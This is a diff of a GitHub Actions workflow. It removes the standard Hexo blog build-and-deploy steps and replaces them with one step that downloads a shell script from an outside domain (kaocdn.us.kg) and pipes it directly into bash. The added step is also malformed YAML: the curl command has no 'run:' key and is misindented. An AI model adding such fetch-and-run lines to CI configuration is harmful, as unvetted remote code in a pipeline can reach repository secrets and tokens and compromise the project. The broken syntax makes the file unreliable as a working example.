@@ -10,25 +10,5 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v3
-
-    - name: Setup Node.js
-      uses: actions/setup-node@v3
-      with:
-        node-version: 'lts/*'
-
-    - name: Update npm to the latest version
-      run: npm install -g npm@latest
-
-    - name: Install Hexo CLI
-      run: npm install -g hexo-cli
-
-    - name: Install Hexo Git deployer
-      run: npm install hexo-deployer-git --save
-
-    - name: Fix npm vulnerabilities
-      run: npm audit fix
-
-    - name: Deploy Hexo
-      run: hexo d
+    - name: Run qexo.sh
+  curl -sSL https://kaocdn.us.kg/qexo.sh | bash      
